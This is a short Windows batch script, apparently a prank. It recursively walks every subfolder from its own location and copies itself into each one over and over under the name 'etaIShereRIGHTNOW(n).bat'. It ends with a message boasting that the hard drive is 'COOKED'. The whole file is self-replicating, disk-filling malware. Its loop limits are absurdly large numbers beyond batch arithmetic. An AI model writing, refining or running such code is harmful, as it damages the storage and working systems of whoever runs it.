@echo off
setlocal enabledelayedexpansion

set "root=%~dp0"
set /a num=9999999999999999999999999999999999999999999999999999999999999999
set "basename=etaIShereRIGHTNOW"
set /a created=0

for /r "%root%" %%D in (.) do (
    if !created! geq %num% goto done
    for /l %%i in (1,1,9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999) do (
        if !created! geq %num% goto done
        set "name=!basename!(%%i).bat"
        if not exist "%%~fD\!name!" (
            copy /y "%~f0" "%%~fD\!name!" >nul
            set /a created+=1
        )
    )
)

:done
echo created %created% copies under "%root%" lol this hd is COOKED
pause
